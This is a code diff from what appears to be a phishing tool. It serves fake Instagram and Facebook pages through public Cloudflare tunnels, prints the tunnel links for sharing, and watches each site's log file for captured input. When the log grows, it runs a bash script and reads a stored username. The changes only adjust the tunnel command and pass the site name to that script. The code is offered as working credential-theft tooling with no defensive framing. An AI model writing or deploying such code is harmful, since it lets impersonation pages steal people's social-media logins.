@@ -7,13 +7,13 @@ def sites():
 			f = open("process/new.txt")
 			copyplace.delete(0, END)
 			copyplace.insert(INSERT, f.read())
-		link = os.system("cd assets/sites/instagram; hostit -f cloudflare 8080 > ../../../process/link.txt dev/null 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' '../../../process/link.txt' > ../../../process/new.txt; rm ../../../process/link.txt")
+		link = os.system("cd assets/sites/instagram; hostit -f cloudflare 8080 --silent> ../../../process/link.txt 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' '../../../process/link.txt' > ../../../process/new.txt; rm ../../../process/link.txt")
 		def capture():
 			file_size = os.path.getsize('assets/sites/instagram/log.txt')
 			while True:
 				new_size=os.path.getsize('assets/sites/instagram/log.txt')
 				if (new_size > file_size):
-					os.system("bash assets/bashscript.sh")
+					os.system("bash assets/bashscript.sh instagram")
 					break
 		def uname():
 			g= open('process/username.txt', 'r')	 
@@ -74,13 +74,13 @@ def sites():
 			f = open("process/new.txt")
 			copyplace.delete(0, END)
 			copyplace.insert(INSERT, f.read())
-		link = os.system("cd assets/sites/facebook; hostit -f cloudflare 8080 > ../../../process/link.txt dev/null 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' '../../../process/link.txt' > ../../../process/new.txt; rm ../../../process/link.txt")
+		link = os.system("cd assets/sites/facebook; hostit -f cloudflare 8080 --silent> ../../../process/link.txt 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' '../../../process/link.txt' > ../../../process/new.txt; rm ../../../process/link.txt")
 		def capture():
 			file_size = os.path.getsize('assets/sites/facebook/log.txt')
 			while True:
 				new_size=os.path.getsize('assets/sites/facebook/log.txt')
 				if (new_size > file_size):
-					os.system("bash assets/bashscript.sh")
+					os.system("bash assets/bashscript.sh facebook")
 					break
 		def uname():
 			g= open('process/username.txt', 'r')	 
